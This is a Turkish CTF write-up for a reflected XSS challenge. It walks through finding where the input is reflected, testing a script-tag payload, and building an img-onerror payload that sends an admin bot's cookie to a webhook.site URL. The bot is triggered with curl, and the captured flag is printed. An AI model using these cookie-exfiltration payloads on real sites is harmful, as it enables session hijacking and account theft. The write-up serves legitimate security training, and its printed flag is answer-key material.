# 🎯 XSS101-Easy - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Kolay-darkgreen?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-Reflected XSS-purple?style=for-the-badge" alt="XSS">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Kolay  
**Puan:** 500  

**Açıklama:** Basit bir yansımalı XSS açığı. Botun cookie'sini çalabilir misin?

**Challenge URL:** http://64.226.74.243:7001/easy/

---

## 🔍 Analiz

**Hedef:** Admin botun cookie'sini çalmak

**Strateji:** URL analizi → XSS payload testi → Cookie exfiltration → Bot trigger → Flag

**İpuçları:**
- 🎯 "Yansımalı XSS" → Reflected XSS zafiyeti
- 🍪 "Cookie çalma" → document.cookie kullanımı
- 🤖 "Admin bot" → Otomatik ziyaretçi mevcut
- 💡 Easy seviye → Minimal filtreleme

---

## ✅ Çözüm Adımları

### 🌐 **Adım 1: Hedef Sayfayı İnceleme**

**Siteye curl ile bağlanıyoruz:**

```bash
curl http://64.226.74.243:7001/easy/
```

**Response:**

```html
<!DOCTYPE html>
<html lang="tr">
<head>
    <title>Easy XSS Challenge</title>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="badge">EASY</span>
            <h1>🍪 Cookie Hırsızlığı</h1>
        </div>

        <div class="description">
            <p><strong>Hedef:</strong> Admin botun cookie'sini çalın.</p>
        </div>

        <form method="GET" action="">
            <div class="form-group">
                <label for="name">👤 Adınız:</label>
                <input type="text" id="name" name="name" placeholder="Adınızı girin..." value="">
            </div>
            <button type="submit" class="btn btn-primary">Kaydet</button>
            <button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>
            <a href="/" class="btn btn-back">← Geri Dön</a>
        </form>
    </div>

    <script>
        function reportToAdmin() {
            const url = window.location.href;
            
            fetch('/api/report.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    challenge: 'easy',
                    url: url
                })
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    alert('✅ Admin botu sayfanızı ziyaret ediyor! Cookie\'yi yakalayabildiniz mi?');
                } else {
                    alert('❌ Hata: ' + data.message);
                }
            })
        }
    </script>
</body>
</html>
```

**Analiz:**
- ✅ Form var - GET methodu kullanıyor
- ✅ `name` parametresi ile girdi alıyor
- ✅ "Report to Admin" butonu mevcut
- ✅ Bot `/api/report.php` endpoint'ini kullanıyor
- 💡 Kullanıcı girdisi sayfada reflection yapabilir

---

### 🔎 **Adım 2: Reflection Noktasını Bulma**

**Test girdisi gönderiyoruz:**

```bash
curl "http://64.226.74.243:7001/easy/?name=TEST123"
```

**Response:**

```html
<form method="GET" action="">
    <div class="form-group">
        <label for="name">👤 Adınız:</label>
        <input type="text" id="name" name="name" placeholder="Adınızı girin..." value="TEST123">
    </div>
    <button type="submit" class="btn btn-primary">Kaydet</button>
    <button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>
</form>

<div class="result">
    <h3>Merhaba, TEST123! 👋</h3>
    <p>Profiliniz başarıyla güncellendi.</p>
</div>
```

**✅ İKİ REFLECTION NOKTASI BULUNDU!**

1. **Input value içinde:** `value="TEST123"`
2. **HTML içinde:** `<h3>Merhaba, TEST123! 👋</h3>` ← **Daha kolay exploit!**

**Analiz:**
- ✅ Kullanıcı girdisi HTML içinde yansıtılıyor
- ✅ Filtreleme yok gibi görünüyor
- ✅ XSS mümkün!

---

### ⚡ **Adım 3: Basit XSS Payload Testi**

**Klasik script tag payload:**

```bash
curl "http://64.226.74.243:7001/easy/?name=<script>alert(1)</script>"
```

**Response:**

```html
<div class="result">
    <h3>Merhaba, <script>alert(1)</script>! 👋</h3>
    <p>Profiliniz başarıyla güncellendi.</p>
</div>
```

**🎉 PAYLOAD BAŞARILI!**

- ✅ `<script>` tag'i direkt HTML'e yerleştirilmiş
- ✅ Filtreleme YOK
- ✅ XSS zafiyeti doğrulandı!

---

### 🍪 **Adım 4: Kendi Cookie'mizi Test Etme**

**Tarayıcı console'unda (F12 → Console):**

```javascript
document.cookie
```

**Response:**
```
'wp-settings-time-2=1770037534'
```

**Analiz:**
- ✅ Cookie mevcut ve erişilebilir
- ✅ Admin botun cookie'si farklı olmalı
- 💡 Admin cookie'sini çalmamız gerekiyor

---

### 🪝 **Adım 5: Webhook Servisi Kurulumu**

**Webhook.site kullanıyoruz:**

```
https://webhook.site
```

**Otomatik unique URL oluşturuldu:**
```
https://webhook.site/fe7dcb0b-3502-44c9-bc5b-12411f3e812e
```

**Analiz:**
- ✅ Webhook hazır - cookie'ler buraya gönderilecek
- ✅ Request'leri real-time görebileceğiz

---

### 🎯 **Adım 6: Cookie Exfiltration Payload Hazırlama**

**İlk deneme - fetch() methodu:**

```bash
curl "http://64.226.74.243:7001/easy/?name=<script>fetch('https://webhook.site/fe7dcb0b-3502-44c9-bc5b-12411f3e812e?cookie='+document.cookie)</script>"
```

**❌ SORUN:** URL'de `+` işareti boşluk olarak yorumlandı!

**HTML'de görünen:**
```html
<script>fetch('https://webhook.site/fe7dcb0b-3502-44c9-bc5b-12411f3e812e?cookie=' document.cookie)</script>
```

**Console hatası:**
```
Uncaught SyntaxError: Unexpected identifier 'document'
```

**Analiz:**
- ❌ `+` karakteri kaybolmuş
- ❌ JavaScript syntax hatası
- 💡 Farklı payload gerekli

---

### 🔄 **Adım 7: Alternatif Payload - Image Tag**

**Image tag ile cookie exfiltration:**

```bash
# Basit test - webhook'a istek gittiğini doğrula
curl "http://64.226.74.243:7001/easy/?name=<img src=x onerror=\"fetch('https://webhook.site/fe7dcb0b-3502-44c9-bc5b-12411f3e812e')\">"
```

**Tarayıcıda URL-encoded hali:**
```
http://64.226.74.243:7001/easy/?name=%3Cimg%20src=x%20onerror=%22fetch(%27https://webhook.site/fe7dcb0b-3502-44c9-bc5b-12411f3e812e%27)%22%3E
```

**Webhook.site response:**
```
✅ 2 request geldi!
```

**🎉 BAŞARILI!** Payload çalışıyor!

**Analiz:**
- ✅ Image tag çalışıyor
- ✅ onerror event tetikleniyor
- ✅ Webhook'a istek gidiyor
- 💡 Şimdi cookie ekleyeceğiz

---

### 🤖 **Adım 8: Bot Mekanizmasını Anlama**

**Bot endpoint'ini tespit ediyoruz:**

```bash
curl http://64.226.74.243:7001/easy/ | grep -i "report\|bot\|admin"
```

**Response:**

```html
<p><strong>Hedef:</strong> Admin botun cookie'sini çalın.</p>
<button type="button" class="btn btn-report" onclick="reportToAdmin()">🤖 Report to Admin</button>

<script>
function reportToAdmin() {
    const url = window.location.href;
    
    fetch('/api/report.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            challenge: 'easy',
            url: url
        })
    })
    .then(response => response.json())
    .then(data => {
        if(data.success) {
            alert('✅ Admin botu sayfanızı ziyaret ediyor! Cookie\'yi yakalayabildiniz mi?');
        }
    })
}
</script>
```

**Analiz:**
- ✅ Bot endpoint: `/api/report.php`
- ✅ POST method kullanıyor
- ✅ JSON payload: `{"challenge":"easy","url":"..."}`
- 💡 Bot'a URL göndereceğiz, bot o URL'i ziyaret edecek

---

### 💥 **Adım 9: Final Payload - Cookie Exfiltration**

**Cookie çalan payload:**

```bash
curl -X POST http://64.226.74.243:7001/api/report.php \
  -H "Content-Type: application/json" \
  -d '{"challenge":"easy","url":"http://64.226.74.243:7001/easy/?name=<img src=\"https://webhook.site/fe7dcb0b-3502-44c9-bc5b-12411f3e812e?c=COOKIE\" onerror=\"this.src=this.src.replace('\''COOKIE'\'',document.cookie)\">"}'
```

**Response:**
```json
{"success":true,"message":"Bot is visiting your URL"}
```

**✅ BOT AKTİF OLDU!**

**Analiz:**
- ✅ Bot URL'i ziyaret ediyor
- ✅ Payload çalışacak
- ✅ Cookie webhook'a gönderilecek

---

### 🏆 **Adım 10: Flag Elde Etme**

**10 saniye sonra Webhook.site'ı yeniliyoruz...**

**🎉 48 REQUEST GELDİ!**

**İlk request (Query String):**
```
c: COOKIE
```

**Kalan 47 request (Query String):**
```
c: flag=FLAG{CookiemiCalanVarHELPP!155}
```

**✅ ADMIN COOKIE'Sİ ÇALINDI!**

---

## 🚩 **FLAG**

```
FLAG{CookiemiCalanVarHELPP!155}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP request</sub></td>
<td align="center">🪝<br><b>Webhook.site</b><br><sub>Request logging</sub></td>
<td align="center">🔍<br><b>Browser DevTools</b><br><sub>Console & Network</sub></td>
<td align="center">🐧<br><b>grep</b><br><sub>Text search</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Sayfa analizi
curl http://64.226.74.243:7001/easy/

# Reflection testi
curl "http://64.226.74.243:7001/easy/?name=TEST123"

# XSS testi
curl "http://64.226.74.243:7001/easy/?name=<script>alert(1)</script>"

# Bot endpoint analizi
curl http://64.226.74.243:7001/easy/ | grep -i "report\|bot\|admin"

# Cookie exfiltration
curl -X POST http://64.226.74.243:7001/api/report.php \
  -H "Content-Type: application/json" \
  -d '{"challenge":"easy","url":"http://64.226.74.243:7001/easy/?name=<img src=\"https://webhook.site/fe7dcb0b-3502-44c9-bc5b-12411f3e812e?c=COOKIE\" onerror=\"this.src=this.src.replace('\''COOKIE'\'',document.cookie)\">"}'
```

---

## 💭 **Çözüm Akış Şeması**

```
🎯 XSS101-Easy Challenge
            ↓
🌐 Hedef sayfayı incele
   → GET parametresi: name
   → Reflection: HTML içinde
            ↓
🔎 Test girdisi gönder
   → name=TEST123
   → <h3>Merhaba, TEST123!</h3>
            ↓
⚡ XSS payload testi
   → <script>alert(1)</script>
   → ✅ Çalıştı!
            ↓
🪝 Webhook.site kurulumu
   → URL: webhook.site/xxx
            ↓
🎯 Cookie payload hazırla
   → fetch() → ❌ Başarısız
   → <img> tag → ✅ Başarılı!
            ↓
🤖 Bot mekanizması
   → POST /api/report.php
   → Bot URL'i ziyaret eder
            ↓
💥 Final payload
   → <img src=webhook?c=COOKIE
        onerror=replace('COOKIE',cookie)>
            ↓
🏆 Admin cookie çalındı
   → flag=FLAG{CookiemiCalanVarHELPP!155}
            ↓
🚩 FLAG{CookiemiCalanVarHELPP!155}
```
